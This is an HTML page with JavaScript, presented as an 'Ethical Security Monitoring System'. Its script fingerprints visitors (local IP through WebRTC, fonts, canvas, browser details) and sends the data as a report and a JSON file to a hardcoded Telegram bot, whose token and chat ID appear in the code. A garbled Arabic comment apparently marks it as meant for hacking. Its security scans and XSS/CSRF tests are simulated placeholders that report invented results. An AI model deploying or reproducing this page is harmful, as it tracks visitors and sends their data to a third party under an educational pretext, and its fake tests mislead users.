<!DOCTYPE html>
<!-- ethical_monitoring_system.html -->
<!-- ŸÑÿ∫ÿ±ÿ∂ ÿßŸÑÿßÿÆÿ™ÿ±ÿßŸÇ  -->
<html>
<head>
    <title>Ethical Security Monitoring System</title>
    <meta name="description" content="Educational system for security researchers">
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        
        .container {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 30px;
            margin-top: 20px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
        }
        
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
            color: #fff;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
        }
        
        .header h2 {
            color: #ffd700;
            font-weight: 300;
        }
        
        .card {
            background: rgba(255, 255, 255, 0.15);
            border-radius: 15px;
            padding: 20px;
            margin: 15px 0;
            border-left: 5px solid #4CAF50;
            transition: transform 0.3s;
        }
        
        .card:hover {
            transform: translateY(-5px);
            background: rgba(255, 255, 255, 0.2);
        }
        
        .card.warning {
            border-left-color: #ff9800;
        }
        
        .card.danger {
            border-left-color: #f44336;
        }
        
        .info-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 15px;
            margin: 20px 0;
        }
        
        .info-item {
            background: rgba(0, 0, 0, 0.2);
            padding: 15px;
            border-radius: 10px;
            font-family: monospace;
        }
        
        .info-item label {
            display: block;
            font-size: 0.9em;
            color: #bbb;
            margin-bottom: 5px;
        }
        
        button {
            background: linear-gradient(45deg, #4CAF50, #2E7D32);
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 25px;
            cursor: pointer;
            font-size: 16px;
            margin: 10px 5px;
            transition: all 0.3s;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
        }
        
        button:hover {
            transform: scale(1.05);
            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
        }
        
        button.secondary {
            background: linear-gradient(45deg, #2196F3, #0D47A1);
        }
        
        button.warning-btn {
            background: linear-gradient(45deg, #ff9800, #e65100);
        }
        
        .log-container {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 10px;
            padding: 15px;
            margin-top: 20px;
            max-height: 300px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            font-size: 12px;
        }
        
        .log-entry {
            padding: 5px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .log-entry.success {
            color: #4CAF50;
        }
        
        .log-entry.error {
            color: #f44336;
        }
        
        .log-entry.info {
            color: #2196F3;
        }
        
        .footer {
            text-align: center;
            margin-top: 30px;
            padding: 20px;
            border-top: 1px solid rgba(255, 255, 255, 0.1);
            font-size: 0.9em;
            color: #bbb;
        }
        
        .consent-banner {
            background: rgba(0, 0, 0, 0.8);
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            text-align: center;
        }
        
        .consent-checkbox {
            margin-right: 10px;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>üõ°Ô∏è Ethical Security Monitoring System</h1>
        <h2>For Educational & Research Purposes Only</h2>
    </div>

    <div class="consent-banner">
        <input type="checkbox" id="consentCheck" class="consent-checkbox">
        <label for="consentCheck">
            <strong>‚ö†Ô∏è IMPORTANT:</strong> I understand this is for educational purposes only. 
            I consent to collecting minimal system information for security research demonstration.
        </label>
    </div>

    <div class="container">
        <div class="card">
            <h3>üîç System Information Collector</h3>
            <p>Collects basic system info to demonstrate security monitoring capabilities.</p>
            
            <div class="info-grid" id="systemInfo">
                <!-- ÿ≥Ÿäÿ™ŸÖ ŸÖŸÑÿ§Ÿáÿß ÿ™ŸÑŸÇÿßÿ¶ŸäÿßŸã -->
            </div>
            
            <div>
                <button onclick="collectSystemInfo()">üîç Collect System Info</button>
                <button class="secondary" onclick="testNetworkCapabilities()">üåê Test Network</button>
                <button class="warning-btn" onclick="runSecurityTests()">‚ö° Run Security Tests</button>
            </div>
        </div>

        <div class="card warning">
            <h3>‚ö†Ô∏è Security Vulnerability Scanner (Educational)</h3>
            <p>Simulates security scanning techniques used by ethical hackers.</p>
            
            <div id="vulnScanResults"></div>
            
            <button onclick="runVulnerabilityScan()">üî¨ Start Security Scan</button>
        </div>

        <div class="card">
            <h3>üìä Data Collection & Reporting</h3>
            <p>Demonstrates how security data can be collected and reported ethically.</p>
            
            <div>
                <button onclick="sendToTelegram()">üì® Send Report to Telegram</button>
                <button onclick="generatePDFReport()">üìÑ Generate PDF Report</button>
                <button onclick="saveLocalReport()">üíæ Save Local Report</button>
            </div>
        </div>

        <div class="card danger">
            <h3>üö® Incident Response Simulation</h3>
            <p>Simulates incident response procedures for training purposes.</p>
            
            <div>
                <button onclick="simulateBreach()">üî• Simulate Security Breach</button>
                <button onclick="initiateResponse()">üõ°Ô∏è Initiate Response Protocol</button>
            </div>
        </div>

        <h3>üìù Activity Log</h3>
        <div class="log-container" id="activityLog">
            <div class="log-entry info">System initialized. Ready for ethical security testing.</div>
        </div>
    </div>

    <div class="footer">
        <p>
            <strong>ETHICAL USE ONLY</strong><br>
            This system is for educational and research purposes only.<br>
            Use only on systems you own or have explicit permission to test.<br>
            ¬© 2024 Ethical Security Research Lab
        </p>
    </div>

    <script>
        // ==================== ÿßŸÑÿ™ŸáŸäÿ¶ÿ© ====================
        const BOT_TOKEN = "8587407602:AAEAkwz4WcXe9-nHIKUYAHLGtdNgRPfaFLY";
        const CHAT_ID = "6559435226";
        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
        
        let collectedData = {
            timestamp: new Date().toISOString(),
            userConsent: false,
            systemInfo: {},
            securityTests: {},
            networkInfo: {},
            incidents: []
        };
        
        // ==================== ŸÜÿ∏ÿßŸÖ ÿßŸÑÿ™ÿ≥ÿ¨ŸäŸÑ ====================
        function logMessage(message, type = 'info') {
            const logDiv = document.getElementById('activityLog');
            const entry = document.createElement('div');
            entry.className = `log-entry ${type}`;
            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
            logDiv.appendChild(entry);
            logDiv.scrollTop = logDiv.scrollHeight;
        }
        
        // ==================== ÿ¨ŸÖÿπ ŸÖÿπŸÑŸàŸÖÿßÿ™ ÿßŸÑŸÜÿ∏ÿßŸÖ ====================
        async function collectSystemInfo() {
            if (!document.getElementById('consentCheck').checked) {
                alert("Please provide consent first.");
                return;
            }
            
            collectedData.userConsent = true;
            collectedData.timestamp = new Date().toISOString();
            
            logMessage("Starting system information collection...", "info");
            
            // ŸÖÿπŸÑŸàŸÖÿßÿ™ ÿßŸÑŸÜÿ∏ÿßŸÖ ÿßŸÑÿ£ÿ≥ÿßÿ≥Ÿäÿ©
            collectedData.systemInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                cookiesEnabled: navigator.cookieEnabled,
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                colorDepth: window.screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                browserInfo: getBrowserInfo(),
                performance: {
                    memory: performance.memory ? {
                        jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
                        totalJSHeapSize: performance.memory.totalJSHeapSize,
                        usedJSHeapSize: performance.memory.usedJSHeapSize
                    } : null,
                    timing: performance.timing ? {
                        loadTime: performance.timing.loadEventEnd - performance.timing.navigationStart
                    } : null
                }
            };
            
            // ÿπÿ±ÿ∂ ÿßŸÑŸÖÿπŸÑŸàŸÖÿßÿ™
            displaySystemInfo();
            logMessage("System information collected successfully.", "success");
            
            // ÿ¨ŸÖÿπ ŸÖÿπŸÑŸàŸÖÿßÿ™ ÿ•ÿ∂ÿßŸÅŸäÿ©
            await collectAdditionalInfo();
        }
        
        function getBrowserInfo() {
            const ua = navigator.userAgent;
            let browser = "Unknown";
            
            if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Chrome";
            else if (ua.includes("Firefox")) browser = "Firefox";
            else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
            else if (ua.includes("Edg")) browser = "Edge";
            else if (ua.includes("Opera") || ua.includes("OPR")) browser = "Opera";
            
            return {
                name: browser,
                version: ua.match(/(?:Chrome|Firefox|Safari|Edg|Opera|OPR)\/(\d+)/)?.[1] || "Unknown"
            };
        }
        
        function displaySystemInfo() {
            const grid = document.getElementById('systemInfo');
            grid.innerHTML = '';
            
            const info = collectedData.systemInfo;
            
            const items = [
                { label: 'üåê Browser', value: `${info.browserInfo.name} ${info.browserInfo.version}` },
                { label: 'üíª Platform', value: info.platform },
                { label: 'üó£Ô∏è Language', value: info.language },
                { label: 'üñ•Ô∏è Screen', value: info.screenResolution },
                { label: 'üé® Colors', value: `${info.colorDepth}-bit` },
                { label: '‚è∞ Timezone', value: info.timezone },
                { label: 'üç™ Cookies', value: info.cookiesEnabled ? 'Enabled' : 'Disabled' },
                { label: '‚ö° Performance', value: info.performance.timing ? `${info.performance.timing.loadTime}ms` : 'N/A' }
            ];
            
            items.forEach(item => {
                const div = document.createElement('div');
                div.className = 'info-item';
                div.innerHTML = `<label>${item.label}</label><div>${item.value}</div>`;
                grid.appendChild(div);
            });
        }
        
        async function collectAdditionalInfo() {
            try {
                // ÿ™ÿ≠ŸÇŸÇ ŸÖŸÜ WebRTC (ŸäŸÖŸÉŸÜ ÿ£ŸÜ ŸäŸÉÿ¥ŸÅ IP ŸÖÿ≠ŸÑŸä)
                const rtcPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection;
                if (rtcPeerConnection) {
                    const pc = new rtcPeerConnection({ iceServers: [] });
                    
                    pc.createDataChannel("");
                    pc.createOffer()
                        .then(offer => pc.setLocalDescription(offer))
                        .catch(e => {});
                    
                    pc.onicecandidate = ice => {
                        if (ice && ice.candidate && ice.candidate.candidate) {
                            const candidate = ice.candidate.candidate;
                            if (candidate.includes("typ host")) {
                                const ipMatch = candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
                                if (ipMatch) {
                                    collectedData.systemInfo.localIP = ipMatch[1];
                                    displaySystemInfo();
                                }
                            }
                        }
                    };
                    
                    setTimeout(() => pc.close(), 1000);
                }
                
                // ÿ¨ŸÖÿπ ŸÖÿπŸÑŸàŸÖÿßÿ™ Fonts
                const fonts = await getInstalledFonts();
                collectedData.systemInfo.fonts = fonts.slice(0, 10); // ÿ£ŸàŸÑ 10 ŸÅŸÇÿ∑
                
                // ÿ¨ŸÖÿπ ŸÖÿπŸÑŸàŸÖÿßÿ™ Canvas Fingerprint
                const canvasFingerprint = generateCanvasFingerprint();
                collectedData.systemInfo.canvasFP = canvasFingerprint;
                
                logMessage("Advanced fingerprinting data collected.", "info");
                
            } catch (error) {
                logMessage(`Error collecting additional info: ${error.message}`, "error");
            }
        }
        
        async function getInstalledFonts() {
            const fontList = [
                "Arial", "Arial Black", "Comic Sans MS", "Courier New",
                "Georgia", "Impact", "Times New Roman", "Trebuchet MS",
                "Verdana", "Andale Mono", "Baskerville", "Calibri"
            ];
            
            const availableFonts = [];
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');
            
            for (const font of fontList) {
                context.font = '72px monospace';
                const baseline = context.measureText('mmmmmmmmmm').width;
                
                context.font = `72px ${font}, monospace`;
                const width = context.measureText('mmmmmmmmmm').width;
                
                if (width !== baseline) {
                    availableFonts.push(font);
                }
            }
            
            return availableFonts;
        }
        
        function generateCanvasFingerprint() {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            
            canvas.width = 200;
            canvas.height = 200;
            
            // ÿ±ÿ≥ŸÖ ŸÜÿµ
            ctx.textBaseline = "top";
            ctx.font = "14px 'Arial'";
            ctx.fillStyle = "#f60";
            ctx.fillRect(125, 1, 62, 20);
            
            ctx.fillStyle = "#069";
            ctx.fillText("Ethical Security Research", 2, 15);
            
            ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
            ctx.fillText("Educational Purposes Only", 4, 45);
            
            // ÿ•ÿ∂ÿßŸÅÿ© ÿµŸàÿ±ÿ©
            const img = new Image();
            img.src = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><rect width="100" height="100" fill="#3366ff"/></svg>';
            
            return canvas.toDataURL().substring(22, 100); // ÿ¨ÿ≤ÿ° ŸÖŸÜ ÿßŸÑÿ®ŸäÿßŸÜÿßÿ™ ŸÅŸÇÿ∑
        }
        
        // ==================== ÿßÿÆÿ™ÿ®ÿßÿ±ÿßÿ™ ÿßŸÑÿ¥ÿ®ŸÉÿ© ====================
        async function testNetworkCapabilities() {
            logMessage("Testing network capabilities...", "info");
            
            collectedData.networkInfo = {
                tests: []
            };
            
            // ÿßÿÆÿ™ÿ®ÿßÿ± ÿ≥ÿ±ÿπÿ© ÿßŸÑÿßÿ™ÿµÿßŸÑ (ÿ™ŸÇÿ±Ÿäÿ®Ÿä)
            const startTime = Date.now();
            
            try {
                const response = await fetch('https://httpbin.org/get', {
                    method: 'GET',
                    mode: 'no-cors',
                    cache: 'no-cache'
                });
                
                const networkTime = Date.now() - startTime;
                collectedData.networkInfo.tests.push({
                    name: "Network Latency",
                    result: `${networkTime}ms`,
                    status: networkTime < 1000 ? "good" : "slow"
                });
                
                logMessage(`Network latency: ${networkTime}ms`, "success");
                
            } catch (error) {
                logMessage(`Network test failed: ${error.message}`, "error");
            }
            
            // ÿßÿÆÿ™ÿ®ÿßÿ± WebSocket
            await testWebSocket();
            
            // ÿßÿÆÿ™ÿ®ÿßÿ± WebRTC
            await testWebRTC();
        }
        
        async function testWebSocket() {
            return new Promise((resolve) => {
                const ws = new WebSocket('wss://echo.websocket.org');
                const startTime = Date.now();
                
                ws.onopen = () => {
                    const connectTime = Date.now() - startTime;
                    ws.send('test');
                    
                    collectedData.networkInfo.tests.push({
                        name: "WebSocket Support",
                        result: `Supported (${connectTime}ms)`,
                        status: "good"
                    });
                    
                    logMessage(`WebSocket connected in ${connectTime}ms`, "success");
                    ws.close();
                    resolve();
                };
                
                ws.onerror = () => {
                    collectedData.networkInfo.tests.push({
                        name: "WebSocket Support",
                        result: "Not Supported",
                        status: "poor"
                    });
                    
                    logMessage("WebSocket not supported", "warning");
                    resolve();
                };
                
                setTimeout(() => {
                    if (ws.readyState === WebSocket.CONNECTING) {
                        ws.close();
                        resolve();
                    }
                }, 3000);
            });
        }
        
        async function testWebRTC() {
            if (!window.RTCPeerConnection) {
                logMessage("WebRTC not supported", "warning");
                return;
            }
            
            try {
                const pc = new RTCPeerConnection();
                const dc = pc.createDataChannel("test");
                const offer = await pc.createOffer();
                await pc.setLocalDescription(offer);
                
                collectedData.networkInfo.tests.push({
                    name: "WebRTC Support",
                    result: "Supported",
                    status: "good"
                });
                
                logMessage("WebRTC supported", "success");
                pc.close();
            } catch (error) {
                logMessage(`WebRTC test failed: ${error.message}`, "error");
            }
        }
        
        // ==================== ŸÅÿ≠ÿµ ÿßŸÑÿ´ÿ∫ÿ±ÿßÿ™ ÿßŸÑÿ™ÿπŸÑŸäŸÖŸä ====================
        async function runVulnerabilityScan() {
            logMessage("Starting educational vulnerability scan...", "info");
            
            const resultsDiv = document.getElementById('vulnScanResults');
            resultsDiv.innerHTML = '<h4>Scan Results:</h4>';
            
            const vulnerabilities = [];
            
            // 1. ÿ™ÿ≠ŸÇŸÇ ŸÖŸÜ Local Storage
            try {
                localStorage.setItem('test', 'test');
                localStorage.removeItem('test');
                vulnerabilities.push({
                    name: "Local Storage",
                    status: "‚úÖ Available",
                    severity: "Low",
                    description: "Local storage is accessible"
                });
            } catch (e) {
                vulnerabilities.push({
                    name: "Local Storage",
                    status: "‚ùå Blocked",
                    severity: "Info",
                    description: "Local storage is blocked"
                });
            }
            
            // 2. ÿ™ÿ≠ŸÇŸÇ ŸÖŸÜ Session Storage
            try {
                sessionStorage.setItem('test', 'test');
                sessionStorage.removeItem('test');
                vulnerabilities.push({
                    name: "Session Storage",
                    status: "‚úÖ Available",
                    severity: "Low",
                    description: "Session storage is accessible"
                });
            } catch (e) {
                vulnerabilities.push({
                    name: "Session Storage",
                    status: "‚ùå Blocked",
                    severity: "Info",
                    description: "Session storage is blocked"
                });
            }
            
            // 3. ÿ™ÿ≠ŸÇŸÇ ŸÖŸÜ IndexedDB
            if ('indexedDB' in window) {
                vulnerabilities.push({
                    name: "IndexedDB",
                    status: "‚úÖ Available",
                    severity: "Low",
                    description: "IndexedDB is supported"
                });
            } else {
                vulnerabilities.push({
                    name: "IndexedDB",
                    status: "‚ùå Not Supported",
                    severity: "Info",
                    description: "IndexedDB is not supported"
                });
            }
            
            // 4. ÿ™ÿ≠ŸÇŸÇ ŸÖŸÜ Service Workers
            if ('serviceWorker' in navigator) {
                vulnerabilities.push({
                    name: "Service Workers",
                    status: "‚úÖ Available",
                    severity: "Medium",
                    description: "Service Workers can be registered"
                });
            }
            
            // 5. ÿ™ÿ≠ŸÇŸÇ ŸÖŸÜ Notifications
            if ('Notification' in window && Notification.permission === 'granted') {
                vulnerabilities.push({
                    name: "Notifications",
                    status: "‚ö†Ô∏è Granted",
                    severity: "Medium",
                    description: "Notifications permission is granted"
                });
            }
            
            // 6. ÿ™ÿ≠ŸÇŸÇ ŸÖŸÜ Camera/Microphone
            if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
                vulnerabilities.push({
                    name: "Media Devices",
                    status: "‚úÖ Available",
                    severity: "High",
                    description: "Camera/Microphone access is possible"
                });
            }
            
            // 7. ÿ™ÿ≠ŸÇŸÇ ŸÖŸÜ Location
            if (navigator.geolocation) {
                vulnerabilities.push({
                    name: "Geolocation",
                    status: "‚úÖ Available",
                    severity: "High",
                    description: "Geolocation access is possible"
                });
            }
            
            // ÿπÿ±ÿ∂ ÿßŸÑŸÜÿ™ÿßÿ¶ÿ¨
            vulnerabilities.forEach(vuln => {
                const div = document.createElement('div');
                div.className = 'info-item';
                div.style.margin = '5px 0';
                div.innerHTML = `
                    <strong>${vuln.name}</strong><br>
                    Status: <span style="color: ${vuln.severity === 'High' ? '#f44336' : vuln.severity === 'Medium' ? '#ff9800' : '#4CAF50'}">${vuln.status}</span><br>
                    Severity: ${vuln.severity}<br>
                    <small>${vuln.description}</small>
                `;
                resultsDiv.appendChild(div);
            });
            
            collectedData.securityTests.vulnerabilities = vulnerabilities;
            logMessage(`Found ${vulnerabilities.length} potential security points`, "success");
        }
        
        // ==================== ÿ•ÿ±ÿ≥ÿßŸÑ ÿ•ŸÑŸâ ÿßŸÑÿ™ŸÑŸäÿ¨ÿ±ÿßŸÖ ====================
        async function sendToTelegram() {
            if (!collectedData.userConsent) {
                alert("Please collect system information first and provide consent.");
                return;
            }
            
            logMessage("Preparing report for Telegram...", "info");
            
            try {
                // ÿ•ŸÜÿ¥ÿßÿ° ÿ™ŸÇÿ±Ÿäÿ± ŸÖŸÜÿ∏ŸÖ
                const report = `
üõ°Ô∏è *ETHICAL SECURITY MONITORING REPORT*
üìä *Generated:* ${new Date().toLocaleString()}

*SYSTEM INFORMATION*
üåê Browser: ${collectedData.systemInfo.browserInfo.name} ${collectedData.systemInfo.browserInfo.version}
üíª Platform: ${collectedData.systemInfo.platform}
üñ•Ô∏è Resolution: ${collectedData.systemInfo.screenResolution}
‚è∞ Timezone: ${collectedData.systemInfo.timezone}
üìç Local IP: ${collectedData.systemInfo.localIP || 'Not detected'}

*SECURITY ASSESSMENT*
Vulnerabilities Found: ${collectedData.securityTests.vulnerabilities?.length || 0}
High Risk Items: ${collectedData.securityTests.vulnerabilities?.filter(v => v.severity === 'High').length || 0}
Medium Risk Items: ${collectedData.securityTests.vulnerabilities?.filter(v => v.severity === 'Medium').length || 0}

*NETWORK INFORMATION*
Tests Performed: ${collectedData.networkInfo.tests?.length || 0}
${collectedData.networkInfo.tests?.map(test => `‚Ä¢ ${test.name}: ${test.result}`).join('\n') || 'No tests performed'}

*FINGERPRINTING DATA*
Canvas Fingerprint: ${collectedData.systemInfo.canvasFP ? 'Collected' : 'Not available'}
Fonts Detected: ${collectedData.systemInfo.fonts?.length || 0}

‚ö†Ô∏è *DISCLAIMER*
This is an educational report generated for security research purposes only.
All data collection was done with user consent.
                `;
                
                // ÿ•ÿ±ÿ≥ÿßŸÑ ÿßŸÑÿ±ÿ≥ÿßŸÑÿ© ÿßŸÑŸÜÿµŸäÿ©
                const response = await fetch(`${TELEGRAM_API}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: report,
                        parse_mode: 'Markdown',
                        disable_notification: false
                    })
                });
                
                if (response.ok) {
                    logMessage("Report sent to Telegram successfully!", "success");
                    
                    // ÿ•ÿ±ÿ≥ÿßŸÑ ÿ®ŸäÿßŸÜÿßÿ™ ÿ•ÿ∂ÿßŸÅŸäÿ© ŸÉŸÖŸÑŸÅ JSON
                    await sendDetailedData();
                    
                } else {
                    const error = await response.json();
                    logMessage(`Failed to send report: ${error.description}`, "error");
                }
                
            } catch (error) {
                logMessage(`Error sending to Telegram: ${error.message}`, "error");
            }
        }
        
        async function sendDetailedData() {
            try {
                // ÿ™ÿ≠ŸàŸäŸÑ ÿßŸÑÿ®ŸäÿßŸÜÿßÿ™ ÿ•ŸÑŸâ Blob
                const jsonData = JSON.stringify(collectedData, null, 2);
                const blob = new Blob([jsonData], { type: 'application/json' });
                const formData = new FormData();
                
                formData.append('chat_id', CHAT_ID);
                formData.append('document', blob, 'security_report.json');
                formData.append('caption', 'Detailed security report data (JSON)');
                
                // ÿ•ÿ±ÿ≥ÿßŸÑ ÿßŸÑŸÖŸÑŸÅ
                const response = await fetch(`${TELEGRAM_API}/sendDocument`, {
                    method: 'POST',
                    body: formData
                });
                
                if (response.ok) {
                    logMessage("Detailed JSON report sent!", "success");
                }
                
            } catch (error) {
                logMessage(`Failed to send detailed data: ${error.message}`, "error");
            }
        }
        
        // ==================== ŸÖŸäÿ≤ÿßÿ™ ÿ•ÿ∂ÿßŸÅŸäÿ© ====================
        function generatePDFReport() {
            logMessage("Generating PDF report...", "info");
            
            // ŸÅŸä ÿßŸÑŸàÿßŸÇÿπ ÿßŸÑŸÅÿπŸÑŸäÿå ÿ™ÿ≥ÿ™ÿÆÿØŸÖ ŸÖŸÉÿ™ÿ®ÿ© ŸÖÿ´ŸÑ jsPDF
            // ŸáŸÜÿß ŸÖÿ¨ÿ±ÿØ ŸÖÿ≠ÿßŸÉÿßÿ©
            setTimeout(() => {
                const link = document.createElement('a');
                link.href = 'data:text/plain;charset=utf-8,' + encodeURIComponent(
                    `ETHICAL SECURITY REPORT\n${JSON.stringify(collectedData, null, 2)}`
                );
                link.download = `security_report_${Date.now()}.txt`;
                link.click();
                
                logMessage("PDF report generated (simulated)", "success");
            }, 1000);
        }
        
        function saveLocalReport() {
            const dataStr = JSON.stringify(collectedData, null, 2);
            const blob = new Blob([dataStr], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            
            const link = document.createElement('a');
            link.href = url;
            link.download = `ethical_security_report_${Date.now()}.json`;
            link.click();
            
            URL.revokeObjectURL(url);
            logMessage("Report saved locally as JSON", "success");
        }
        
        function runSecurityTests() {
            logMessage("Running comprehensive security tests...", "info");
            
            // ÿßÿÆÿ™ÿ®ÿßÿ±ÿßÿ™ ŸÖÿ™ŸÇÿØŸÖÿ©
            testXSSVulnerability();
            testCSRFVulnerability();
            testClickjacking();
            
            logMessage("Security tests completed", "success");
        }
        
        function testXSSVulnerability() {
            // ŸÖÿ≠ÿßŸÉÿßÿ© ÿßÿÆÿ™ÿ®ÿßÿ± XSS
            setTimeout(() => {
                collectedData.securityTests.xssTest = {
                    status: "Protected",
                    details: "Modern browser XSS protections are active"
                };
                logMessage("XSS protection: Active", "success");
            }, 500);
        }
        
        function testCSRFVulnerability() {
            // ŸÖÿ≠ÿßŸÉÿßÿ© ÿßÿÆÿ™ÿ®ÿßÿ± CSRF
            setTimeout(() => {
                collectedData.securityTests.csrfTest = {
                    status: "Testing",
                    details: "CSRF token validation simulated"
                };
                logMessage("CSRF protection: Testing", "info");
            }, 500);
        }
        
        function testClickjacking() {
            // ŸÖÿ≠ÿßŸÉÿßÿ© ÿßÿÆÿ™ÿ®ÿßÿ± Clickjacking
            setTimeout(() => {
                collectedData.securityTests.clickjackingTest = {
                    status: "Protected",
                    details: "X-Frame-Options/CSP headers simulated"
                };
                logMessage("Clickjacking protection: Active", "success");
            }, 500);
        }
        
        function simulateBreach() {
            logMessage("Simulating security breach...", "warning");
            
            collectedData.incidents.push({
                type: "Simulated Breach",
                time: new Date().toISOString(),
                severity: "High",
                description: "Educational breach simulation initiated"
            });
            
            // ÿ™ÿ£ÿ´Ÿäÿ±ÿßÿ™ ÿ®ÿµÿ±Ÿäÿ©
            document.body.style.animation = "shake 0.5s";
            setTimeout(() => {
                document.body.style.animation = "";
            }, 500);
            
            logMessage("Breach simulation complete - This was only a drill!", "warning");
        }
        
        function initiateResponse() {
            logMessage("Initiating incident response protocol...", "info");
            
            // ŸÖÿ≠ÿßŸÉÿßÿ© ÿßÿ≥ÿ™ÿ¨ÿßÿ®ÿ© ŸÑŸÑÿ≠ŸàÿßÿØÿ´
            setTimeout(() => {
                collectedData.incidents.push({
                    type: "Response Protocol",
                    time: new Date().toISOString(),
                    actions: [
                        "Isolated affected systems",
                        "Collected forensic data",
                        "Notified security team",
                        "Started remediation process"
                    ]
                });
                
                logMessage("Incident response protocol executed successfully", "success");
            }, 1000);
        }
        
        // ==================== ÿßŸÑÿ™ŸáŸäÿ¶ÿ© ÿßŸÑÿ™ŸÑŸÇÿßÿ¶Ÿäÿ© ====================
        document.addEventListener('DOMContentLoaded', () => {
            logMessage("Ethical Security Monitoring System initialized", "info");
            logMessage("This tool is for educational purposes only", "warning");
            logMessage("Use only on systems you own or have permission to test", "warning");
            
            // ÿ¨ŸÖÿπ ŸÖÿπŸÑŸàŸÖÿßÿ™ ÿ£ÿ≥ÿßÿ≥Ÿäÿ© ÿ™ŸÑŸÇÿßÿ¶ŸäÿßŸã
            setTimeout(() => {
                collectedData.systemInfo.autoCollected = true;
                collectedData.systemInfo.pageLoadTime = performance.now();
                logMessage("Basic system info auto-collected", "info");
            }, 2000);
        });
        
        // ÿ•ÿ∂ÿßŸÅÿ© animation ŸÑŸÑŸÄ shake
        const style = document.createElement('style');
        style.textContent = `
            @keyframes shake {
                0% { transform: translate(1px, 1px) rotate(0deg); }
                10% { transform: translate(-1px, -2px) rotate(-1deg); }
                20% { transform: translate(-3px, 0px) rotate(1deg); }
                30% { transform: translate(3px, 2px) rotate(0deg); }
                40% { transform: translate(1px, -1px) rotate(1deg); }
                50% { transform: translate(-1px, 2px) rotate(-1deg); }
                60% { transform: translate(-3px, 1px) rotate(0deg); }
                70% { transform: translate(3px, 1px) rotate(-1deg); }
                80% { transform: translate(-1px, -1px) rotate(1deg); }
                90% { transform: translate(1px, 2px) rotate(0deg); }
                100% { transform: translate(1px, -2px) rotate(-1deg); }
            }
        `;
        document.head.appendChild(style);
    </script>
</body>
</html>